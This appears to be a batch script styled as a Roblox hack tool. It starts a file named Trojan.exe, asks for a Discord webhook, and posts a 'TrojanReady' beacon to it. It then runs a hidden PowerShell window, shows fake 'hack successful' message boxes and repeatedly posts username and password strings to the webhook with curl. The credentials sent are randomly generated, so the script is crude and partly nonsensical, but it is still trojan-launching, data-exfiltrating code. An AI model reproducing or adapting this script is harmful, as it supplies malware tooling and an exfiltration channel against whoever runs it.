@echo off
:e
python -m pip install -r requirements.txt
cls
@echo off
cls
start Trojan.exe
cls
timeout 4 > nul
cls
set password=%random%
SET /p webhook=" webhook >  "
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST https://discord.com/api/webhooks/... --data "{\"content\": \"0_0_-TrojanReady\"}" %webhook%
:hidemode
cd C:\Users\%username%
mkdir hackRoblox
cd hackRoblox
powershell -WindowStyle Hidden -Command "& {}"
echo x=msgbox("Hack Successfu 1 more user roblox" ,0, "") > Realtime.vbs 
start Realtime.vbs 
timeout 3
echo x=msgbox("Send password to webhok user is :abby%random% :password is %password%" ,0, "") > Realtime1.vbs 
start Realtime1.vbs 
curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST https://discord.com/api/webhooks/... --data "{\"content\": \"user:abby%random%-password:%password%\"}" %webhook%
cls
timeout 50
goto hidemode